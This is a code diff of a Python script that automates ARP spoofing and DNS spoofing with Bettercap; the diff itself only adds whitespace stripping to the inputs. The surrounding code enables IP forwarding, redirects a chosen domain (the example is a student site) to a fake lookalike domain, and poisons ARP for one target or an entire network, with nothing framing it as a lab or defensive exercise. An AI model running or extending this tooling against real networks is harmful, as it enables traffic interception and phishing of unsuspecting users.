@@ -48,14 +48,14 @@ try:
     run_command("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
 
     # Step 2: Start Bettercap with the specified network interface
-    network_interface = input("Enter the network interface (e.g., eth0, wlan0): ")
+    network_interface = input("Enter the network interface (e.g., eth0, wlan0): ").strip()
     bettercap_start_command = f"sudo bettercap -iface {network_interface}"
     print("\nStarting Bettercap...")
     bettercap_process = subprocess.Popen(bettercap_start_command, shell=True)
 
     # Step 3: User input for domains
-    target_domain = input("Enter the domain you want to spoof (e.g., flexstudent.com): ")
-    redirect_domain = input("Enter the domain you want to redirect to (e.g., fakeflex.com): ")
+    target_domain = input("Enter the domain you want to spoof (e.g., flexstudent.com): ").strip()
+    redirect_domain = input("Enter the domain you want to redirect to (e.g., fakeflex.com): ").strip()
 
     # Step 4: Configure DNS Spoofing
     dns_spoof_file = "/usr/share/bettercap/caplets/dns.spoof.hosts"
@@ -69,7 +69,7 @@ try:
         print("Error: Run this script with sudo or add permissions to edit the DNS spoofing hosts file.")
 
     # Step 5: Enable ARP Spoofing
-    target_ip = input("Enter target IP (or leave blank for entire network): ")
+    target_ip = input("Enter target IP (or leave blank for entire network): ").strip()
     if target_ip:
         run_command(f"echo 'set arp.spoof.targets {target_ip}' | sudo bettercap")
     run_command("echo 'arp.spoof on' | sudo bettercap")
